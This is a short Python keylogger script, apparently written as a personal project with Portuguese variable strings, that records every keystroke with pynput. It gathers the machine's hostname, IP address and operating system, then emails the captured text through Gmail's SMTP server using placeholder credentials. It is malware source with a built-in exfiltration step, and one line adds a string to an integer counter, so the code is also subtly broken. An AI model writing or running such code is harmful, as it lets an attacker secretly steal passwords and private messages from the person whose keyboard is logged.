import smtplib
import platform
import socket
import subprocess
from pynput.keyboard import Key, Listener

root = 'Exemplo@email.com'
port = 'senha'
sever = smtplib.SMTP_SSL('smtp.gmail.com', 465)
sever.login(root, port)

log = 0
words = ''
root_char_limit = 100

def on_press(key):
    global words
    global log 
    global root
    global root_char_limit 
    
    if log >= 100:
        envio()
        log = 0
    if key == Key.space: 
        words+= ' '
        log += words
        words = ''  
    elif key == Key.enter:
        words+='\n'       
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else :
        char = f'{key}'
        char = char[1:-1]
        words += char 
    if key == Key.esc:
        words = words[:-5]
        words+=' /esc/ '
    if key == Key.up:
        words = words[:-4]
        words+=' /up/ '
    if key == Key.down:
        words = words[:-6]
        words+=' /dow/ '
    if key == Key.left:
        words = words[:-6]
        words+=' /left/ '
    if key == Key.right:
        words = words[:-7]
        words+=' /right/ '
    log += 1    

hostname = '\nhostname: ' + socket.gethostname()
ip = '\nip: ' + socket.gethostbyname(socket.gethostname())
system = '\nsistema: ' + platform.system()
machine = '\nmachine: ' + platform.machine()

def envio():
    sever.sendmail(
        root, 
        root, 
        hostname + ip + system + machine + '\nKeyLogger:\n' + words
    )

with Listener(on_press=on_press) as listener:
    listener.join()  
   